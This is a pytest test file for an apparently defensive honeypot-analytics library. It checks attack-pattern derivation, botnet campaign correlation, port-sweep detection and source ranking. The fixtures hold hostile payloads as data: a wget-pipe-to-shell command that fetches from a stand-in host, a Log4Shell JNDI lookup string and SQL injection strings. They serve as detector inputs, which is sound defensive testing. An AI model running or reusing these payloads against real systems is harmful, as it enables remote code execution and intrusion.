"""Pattern derivation, campaign correlation and sweep detection."""

from __future__ import annotations

from datetime import timedelta

from conftest import make_record

from deception_shield.patterns import (
    _containing_network,
    correlate_campaigns,
    derive_patterns,
    detect_sweeps,
    jaccard,
    summarise_sources,
    technique_breakdown,
)


class TestDerivePatterns:
    def test_no_records_yields_no_patterns(self) -> None:
        assert derive_patterns([]) == []

    def test_one_record_can_produce_several_patterns(self) -> None:
        """A payload exhibiting two behaviours is evidence of both."""
        patterns = derive_patterns([make_record(payload=b"wget http://x/m.sh | sh")])
        assert {p.name for p in patterns} == {"remote_payload_fetch", "shell_pipe_execution"}

    def test_occurrences_and_sources_are_counted_separately(self) -> None:
        records = [
            make_record("203.0.113.1", payload=b"${jndi:ldap://a/b}"),
            make_record("203.0.113.1", payload=b"${jndi:ldap://a/b}", minutes_offset=1),
            make_record("203.0.113.2", payload=b"${jndi:ldap://a/b}", minutes_offset=2),
        ]
        pattern = next(p for p in derive_patterns(records) if p.name == "log4shell")
        assert pattern.occurrences == 3
        assert pattern.unique_sources == 2

    def test_patterns_are_ordered_by_frequency(self) -> None:
        records = [make_record(payload=b"${jndi:ldap://a/b}", minutes_offset=i) for i in range(5)]
        records += [make_record(payload=b"' OR '1'='1")]
        patterns = derive_patterns(records)
        assert patterns[0].name == "log4shell"

    def test_technique_is_attached(self) -> None:
        pattern = derive_patterns([make_record(payload=b"${jndi:ldap://a/b}")])[0]
        assert pattern.technique == "T1190"

    def test_time_window_spans_first_to_last(self) -> None:
        records = [make_record(payload=b"${jndi:ldap://a/b}", minutes_offset=m) for m in (0, 30)]
        pattern = derive_patterns(records)[0]
        assert pattern.duration_hours == 0.5

    def test_sources_per_occurrence_distinguishes_distribution(self) -> None:
        """Many hosts trying once looks different from one host trying often."""
        distributed = derive_patterns(
            [make_record(f"203.0.113.{i}", payload=b"${jndi:ldap://a/b}", minutes_offset=i) for i in range(5)]
        )[0]
        repeated = derive_patterns(
            [make_record("203.0.113.1", payload=b"${jndi:ldap://a/b}", minutes_offset=i) for i in range(5)]
        )[0]
        assert distributed.sources_per_occurrence == 1.0
        assert repeated.sources_per_occurrence == 0.2


class TestJaccard:
    def test_identical_profiles(self) -> None:
        assert jaccard(frozenset({"a", "b"}), frozenset({"a", "b"})) == 1.0

    def test_disjoint_profiles(self) -> None:
        assert jaccard(frozenset({"a"}), frozenset({"b"})) == 0.0

    def test_partial_overlap(self) -> None:
        assert jaccard(frozenset({"a", "b"}), frozenset({"b", "c"})) == pytest_approx(1 / 3)

    def test_empty_profile_is_zero(self) -> None:
        assert jaccard(frozenset(), frozenset({"a"})) == 0.0


def pytest_approx(value: float, tolerance: float = 1e-6):
    class _Approx:
        def __eq__(self, other: object) -> bool:
            return abs(float(other) - value) < tolerance  # type: ignore[arg-type]

        def __repr__(self) -> str:
            return f"~{value}"

    return _Approx()


class TestCampaignCorrelation:
    def test_coordinated_hosts_are_grouped(self, botnet_records) -> None:
        campaigns = correlate_campaigns(botnet_records)
        assert len(campaigns) == 1
        assert len(campaigns[0].sources) == 4
        assert all(s.startswith("203.0.113.") for s in campaigns[0].sources)

    def test_unrelated_traffic_is_excluded(self, botnet_records) -> None:
        """Benign hosts must not be swept into a campaign."""
        sources = correlate_campaigns(botnet_records)[0].sources
        assert "198.51.100.20" not in sources

    def test_single_source_is_not_a_campaign(self) -> None:
        records = [make_record("203.0.113.1", payload=b"wget http://x/a | sh", minutes_offset=i) for i in range(4)]
        assert correlate_campaigns(records) == []

    def test_time_separation_breaks_correlation(self) -> None:
        """Reused tooling weeks apart is not one coordinated effort."""
        payload = b"wget http://x/m.sh | sh"
        records = [
            make_record("203.0.113.1", payload=payload, minutes_offset=0),
            make_record("203.0.113.2", payload=payload, minutes_offset=60 * 24 * 7),
        ]
        assert correlate_campaigns(records, window=timedelta(hours=6)) == []

    def test_correlation_is_transitive(self) -> None:
        """A chain of similar hosts forms one campaign, not several."""
        payload = b"wget http://x/m.sh | sh"
        records = [
            make_record(f"203.0.113.{i}", payload=payload, minutes_offset=i) for i in range(1, 6)
        ]
        campaigns = correlate_campaigns(records)
        assert len(campaigns) == 1 and len(campaigns[0].sources) == 5

    def test_confidence_is_bounded(self, botnet_records) -> None:
        campaign = correlate_campaigns(botnet_records)[0]
        assert 0.0 <= campaign.confidence <= 1.0

    def test_specific_behaviour_beats_generic(self) -> None:
        """A cluster sharing an exploit outranks one sharing a scanner banner."""
        exploit = [
            make_record(f"203.0.113.{i}", 80, b"wget http://x/m.sh | sh", minutes_offset=i) for i in range(1, 4)
        ]
        banner = [
            make_record(f"198.51.100.{i}", 80, b"User-Agent: zgrab/0.x", minutes_offset=i) for i in range(1, 4)
        ]
        exploit_confidence = correlate_campaigns(exploit)[0].confidence
        banner_confidence = correlate_campaigns(banner)[0].confidence
        assert exploit_confidence > banner_confidence

    def test_shared_port_alone_does_not_correlate(self) -> None:
        """Two hosts probing the same port share no behaviour worth reporting.

        Behaviour profiles include ports, so without an explicit signature
        requirement any two hosts touching 443 would correlate perfectly and
        every quiet day would produce a spurious campaign.
        """
        records = [
            make_record("198.51.100.1", 443, b"GET /healthz HTTP/1.1", minutes_offset=0),
            make_record("198.51.100.2", 443, b"GET /status HTTP/1.1", minutes_offset=1),
        ]
        assert correlate_campaigns(records) == []

    def test_threshold_controls_grouping(self) -> None:
        payload = b"wget http://x/m.sh | sh"
        records = [
            make_record("203.0.113.1", 80, payload, minutes_offset=0),
            make_record("203.0.113.2", 9999, payload, minutes_offset=1),
        ]
        assert correlate_campaigns(records, threshold=0.99) == []
        assert len(correlate_campaigns(records, threshold=0.4)) == 1


class TestSweepDetection:
    def test_broad_port_touching_is_reported(self, sweep_records) -> None:
        sweeps = detect_sweeps(sweep_records)
        assert len(sweeps) == 1
        assert sweeps[0]["source_ip"] == "192.0.2.55"
        assert sweeps[0]["port_count"] == 30

    def test_focused_traffic_is_not_a_sweep(self) -> None:
        records = [make_record("203.0.113.9", 22, b"SSH-2.0", minutes_offset=i) for i in range(50)]
        assert detect_sweeps(records) == []

    def test_threshold_is_configurable(self) -> None:
        records = [make_record("203.0.113.9", 8000 + i, b"probe") for i in range(5)]
        assert detect_sweeps(records, port_threshold=3)
        assert not detect_sweeps(records, port_threshold=10)

    def test_rate_is_none_for_instantaneous_activity(self) -> None:
        records = [make_record("203.0.113.9", 8000 + i, b"probe") for i in range(20)]
        assert detect_sweeps(records)[0]["rate"] is None


class TestSourceSummary:
    def test_ranked_by_peak_severity(self) -> None:
        records = [
            make_record("203.0.113.1", payload=b"GET /", minutes_offset=i) for i in range(10)
        ] + [make_record("203.0.113.2", payload=b"wget http://x/a | sh")]
        assert summarise_sources(records)[0]["source_ip"] == "203.0.113.2"

    def test_limit_is_applied(self) -> None:
        records = [make_record(f"203.0.113.{i}", payload=b"GET /") for i in range(1, 30)]
        assert len(summarise_sources(records, limit=5)) == 5

    def test_enclosing_network_is_reported(self) -> None:
        assert summarise_sources([make_record("203.0.113.77")])[0]["network"] == "203.0.113.0/24"


class TestContainingNetwork:
    def test_ipv4_is_a_slash_24(self) -> None:
        assert _containing_network("192.0.2.200") == "192.0.2.0/24"

    def test_ipv6_is_a_slash_64(self) -> None:
        assert _containing_network("2001:db8::1") == "2001:db8::/64"

    def test_garbage_is_handled(self) -> None:
        assert _containing_network("not-an-ip") == "unknown"


def test_technique_breakdown_rolls_patterns_up() -> None:
    records = [
        make_record("203.0.113.1", payload=b"${jndi:ldap://a/b}"),
        make_record("203.0.113.2", payload=b"' OR '1'='1 union select"),
    ]
    breakdown = technique_breakdown(derive_patterns(records))
    assert any(row["technique"] == "T1190" for row in breakdown)
